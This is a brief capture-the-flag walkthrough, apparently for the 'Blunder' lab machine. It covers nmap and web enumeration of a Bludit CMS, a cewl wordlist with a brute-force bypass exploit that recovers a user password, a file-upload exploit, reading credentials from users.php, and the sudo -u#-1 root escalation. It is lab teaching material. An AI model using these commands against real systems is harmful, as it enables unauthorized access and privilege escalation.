# Blunder

### Nmap

```
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-favicon: Unknown favicon MD5: A0F0E5D852F0E3783AF700B6EE9D00DA
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

### Web Enum

```
http://10.10.10.191/admin/ -> BLUDIT login

http://10.10.10.191/todo.txt
	-Update the CMS
	-Turn off FTP - DONE
	-Remove old users - DONE
	-Inform fergus that the new blog needs images - PENDING 
```

### Exploitation

```bash
# found bf exploit
Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass | php/webapps/48746.rb

# cewl website as password wordlist
cewl http://$IP > cewl.txt

# crack password
ruby 48746.rb -r http://$IP/admin/login -u fergus -w cewl.txt
fergus:RolandDeschain

# exploit
Bludit - Directory Traversal Image File Upload (Metasploit) | php/remote/47699.rb
```

### Priv Esc

```bash

# found hugo cred
/var/www/bludit-3.10.0a/bl-content/databases/users.php
faca404fd5c0a31cf1897b823c695c85cffeb98d:Passwrd120

# swithc hugo
su hogo:Passwrd120

# exploit sudo
sudo -u#-1 /bin/bash
```
